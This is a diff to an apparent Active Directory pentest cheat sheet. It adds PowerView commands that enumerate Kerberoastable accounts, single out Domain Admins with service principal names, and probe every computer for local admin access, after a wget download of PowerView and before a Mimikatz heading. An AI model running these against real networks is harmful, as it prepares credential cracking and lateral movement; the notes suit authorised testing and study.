@@ -293,7 +293,10 @@ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/
 import-module .\PowerView.ps1
 ````
 ````
-Get-NetUser -SPN
+Get-NetUser -SPN #Kerberoastable users
+Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
+Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
+Find-LocalAdminAccess #Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
 ````
 ##### MimiKatz <img src="https://cdn-icons-png.flaticon.com/128/1864/1864514.png" width="40" height="40" /> 
 ````
